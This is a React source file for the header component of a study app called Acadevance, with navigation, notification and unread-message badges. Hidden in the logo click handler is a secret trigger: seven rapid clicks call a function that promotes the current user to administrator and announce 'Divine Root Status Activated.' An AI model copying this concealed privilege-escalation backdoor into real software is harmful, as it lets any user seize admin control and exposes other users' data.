import React, { useState, useEffect } from 'react';
import { Menu, Zap, MessageSquare, Bell, Search } from 'lucide-react';
import { motion, AnimatePresence } from 'framer-motion';
import { notificationService } from '../../services/notificationService';
import NotificationPanel from './NotificationPanel';
import { useNavigate } from 'react-router-dom';
import { authService } from '../../services/authService';
import { supabase } from '../../lib/supabase';

const UniversalHeader = ({ onMenuClick, user }) => {
  const [isNotifyOpen, setIsNotifyOpen] = useState(false);
  const [notifications, setNotifications] = useState([]);
  const [unreadCount, setUnreadCount] = useState(0);
  const [logoClicks, setLogoClicks] = useState(0);
  const [lastClickTime, setLastClickTime] = useState(0);
  const [isSyncing, setIsSyncing] = useState(false);
  const [unreadMessages, setUnreadMessages] = useState(0);
  const [scrolled, setScrolled] = useState(false);
  const navigate = useNavigate();

  // Track scroll for header glass intensification
  useEffect(() => {
    const onScroll = () => setScrolled(window.scrollY > 20);
    window.addEventListener('scroll', onScroll, { passive: true });
    return () => window.removeEventListener('scroll', onScroll);
  }, []);

  useEffect(() => {
    const handleSyncPulse = (e) => {
      setIsSyncing(e.detail.syncing);
    };
    window.addEventListener('acadevance_sync_pulse', handleSyncPulse);
    return () => window.removeEventListener('acadevance_sync_pulse', handleSyncPulse);
  }, []);

  useEffect(() => {
    const loadNotifications = () => {
      const list = notificationService.list();
      setNotifications(list);
      setUnreadCount(notificationService.getUnreadCount());
    };

    loadNotifications();
    fetchUnreadMessages();
    window.addEventListener('acadevance_notification', loadNotifications);
    return () => window.removeEventListener('acadevance_notification', loadNotifications);
  }, []);

  const fetchUnreadMessages = async () => {
    if (!user?.id) return;
    const { count } = await supabase
      .from('messages')
      .select('id', { count: 'exact', head: true })
      .eq('recipient_id', user.id)
      .eq('is_read', false);
    setUnreadMessages(count || 0);
  };

  const handleMarkRead = (id) => {
    notificationService.markRead(id);
    setNotifications(notificationService.list());
    setUnreadCount(notificationService.getUnreadCount());
  };

  const handleMarkAllRead = () => {
    notificationService.markAllRead();
    setNotifications(notificationService.list());
    setUnreadCount(notificationService.getUnreadCount());
  };

  const handleLogoClick = async () => {
    const now = Date.now();
    if (now - lastClickTime < 1000) {
      const newClicks = logoClicks + 1;
      setLogoClicks(newClicks);
      if (newClicks >= 7) {
        await authService.promoteToAdmin();
        setLogoClicks(0);
        notificationService.send("Authority Elevated", "Divine Root Status Activated.", "info");
      }
    } else {
      setLogoClicks(1);
    }
    setLastClickTime(now);
    navigate('/dashboard');
  };

  return (
    <>
      {/* Header — slides down from top on mount */}
      <motion.header
        initial={{ y: -80, opacity: 0 }}
        animate={{ y: 0, opacity: 1 }}
        transition={{ duration: 0.55, ease: [0.16, 1, 0.3, 1] }}
        className="sticky top-0 z-50 h-[60px] w-full border-b border-border px-4 flex items-center justify-between"
        style={{
          background: scrolled
            ? 'rgba(2, 3, 8, 0.92)'
            : 'rgba(2, 3, 8, 0.72)',
          backdropFilter: scrolled ? 'blur(28px) saturate(1.8)' : 'blur(16px)',
          WebkitBackdropFilter: scrolled ? 'blur(28px) saturate(1.8)' : 'blur(16px)',
          borderBottomColor: scrolled ? 'rgba(255,255,255,0.08)' : 'rgba(255,255,255,0.04)',
          transition: 'background 0.4s ease, border-color 0.4s ease, backdrop-filter 0.4s ease',
          boxShadow: scrolled ? '0 4px 32px rgba(0,0,0,0.4), 0 0 0 1px rgba(168,85,247,0.05) inset' : 'none',
        }}
      >
        <div className="flex items-center gap-4">
          {/* Hamburger menu button */}
          <motion.button
            whileHover={{ scale: 1.08, rotate: 5 }}
            whileTap={{ scale: 0.92 }}
            onClick={onMenuClick}
            className="p-2 hover:bg-white/5 rounded-full transition-colors"
          >
            <Menu className="w-6 h-6 text-text-primary" />
          </motion.button>

          {/* Logo */}
          <motion.div
            className="flex items-center gap-1 cursor-pointer select-none"
            onClick={handleLogoClick}
            whileHover={{ scale: 1.03 }}
            whileTap={{ scale: 0.97 }}
          >
            <motion.span
              className="text-xl font-black tracking-tighter"
              style={{
                background: 'linear-gradient(120deg, #ffffff 0%, #d8b4fe 40%, #67e8f9 70%, #ffffff 100%)',
                backgroundSize: '200% auto',
                WebkitBackgroundClip: 'text',
                WebkitTextFillColor: 'transparent',
                backgroundClip: 'text',
                animation: 'text-shimmer 4s linear infinite',
              }}
            >
              ⚡ ACADEVANCE
            </motion.span>
          </motion.div>

          {/* Sync badge */}
          <AnimatePresence>
            {isSyncing && (
              <motion.div
                initial={{ opacity: 0, scale: 0.7, x: -10 }}
                animate={{ opacity: 1, scale: 1, x: 0 }}
                exit={{ opacity: 0, scale: 0.7, x: -10 }}
                transition={{ type: 'spring', stiffness: 400, damping: 25 }}
                className="flex items-center gap-2 bg-nuvio-cyan/15 border border-nuvio-cyan/30 text-nuvio-cyan px-3 py-1 rounded-full font-black text-[9px] uppercase tracking-widest"
              >
                <div className="w-1.5 h-1.5 rounded-full bg-nuvio-cyan animate-pulse" />
                Cloud Sync
              </motion.div>
            )}
          </AnimatePresence>
        </div>

        <div className="flex items-center gap-2 md:gap-3">
          {/* XP Boost Badge */}
          <AnimatePresence>
            {user?.xp_multiplier > 1 && (
              <motion.div
                initial={{ opacity: 0, scale: 0.6 }}
                animate={{ opacity: 1, scale: 1 }}
                exit={{ opacity: 0, scale: 0.6 }}
                transition={{ type: 'spring', stiffness: 350, damping: 22 }}
                className="hidden sm:flex items-center gap-2 px-3 py-1.5 bg-nuvio-yellow/10 border border-nuvio-yellow/20 rounded-full"
              >
                <Zap className="w-4 h-4 text-nuvio-yellow fill-nuvio-yellow" />
                <span className="text-xs font-bold text-nuvio-yellow">{user.xp_multiplier}X XP Active</span>
              </motion.div>
            )}
          </AnimatePresence>

          {/* Messages button */}
          <motion.button
            whileHover={{ scale: 1.1, y: -1 }}
            whileTap={{ scale: 0.9 }}
            onClick={() => navigate('/messages')}
            className="relative p-2 hover:bg-white/5 rounded-full transition-colors"
          >
            <MessageSquare className="w-5 h-5 text-text-secondary" />
            <AnimatePresence>
              {unreadMessages > 0 && (
                <motion.span
                  key="msg-badge"
                  initial={{ scale: 0, opacity: 0 }}
                  animate={{ scale: 1, opacity: 1 }}
                  exit={{ scale: 0, opacity: 0 }}
                  transition={{ type: 'spring', stiffness: 500, damping: 25 }}
                  className="absolute top-1 right-1 w-4 h-4 bg-nuvio-red text-[10px] font-bold text-white flex items-center justify-center rounded-full border-2 border-background-base"
                >
                  {unreadMessages}
                </motion.span>
              )}
            </AnimatePresence>
          </motion.button>

          {/* Bell button */}
          <motion.button
            whileHover={{ scale: 1.1, y: -1 }}
            whileTap={{ scale: 0.9 }}
            onClick={() => setIsNotifyOpen(true)}
            className="relative p-2 hover:bg-white/5 rounded-full transition-colors"
          >
            <motion.div
              animate={unreadCount > 0 ? { rotate: [0, -15, 15, -10, 10, 0] } : {}}
              transition={{ repeat: Infinity, repeatDelay: 4, duration: 0.5 }}
            >
              <Bell className="w-5 h-5 text-text-secondary" />
            </motion.div>
            <AnimatePresence>
              {unreadCount > 0 && (
                <motion.span
                  key="notif-badge"
                  initial={{ scale: 0, opacity: 0 }}
                  animate={{ scale: 1, opacity: 1 }}
                  exit={{ scale: 0, opacity: 0 }}
                  transition={{ type: 'spring', stiffness: 500, damping: 25 }}
                  className="absolute top-1.5 right-1.5 w-2 h-2 bg-nuvio-purple-500 rounded-full border-2 border-background-base"
                >
                  <span className="absolute inset-0 rounded-full bg-nuvio-purple-500 animate-ping opacity-75" />
                </motion.span>
              )}
            </AnimatePresence>
          </motion.button>

          {/* Avatar */}
          <motion.div
            onClick={() => navigate('/profile')}
            whileHover={{ scale: 1.12, rotate: 5 }}
            whileTap={{ scale: 0.9 }}
            className="w-8 h-8 rounded-full bg-nuvio-purple-500/80 flex items-center justify-center text-lg border-2 border-white/10 overflow-hidden cursor-pointer"
            style={{
              boxShadow: '0 0 12px rgba(168,85,247,0.4)',
            }}
          >
            {user?.avatar_emoji || '👤'}
          </motion.div>
        </div>
      </motion.header>

      <NotificationPanel
        isOpen={isNotifyOpen}
        onClose={() => setIsNotifyOpen(false)}
        notifications={notifications}
        onMarkRead={handleMarkRead}
        onMarkAllRead={handleMarkAllRead}
      />
    </>
  );
};

export default UniversalHeader;
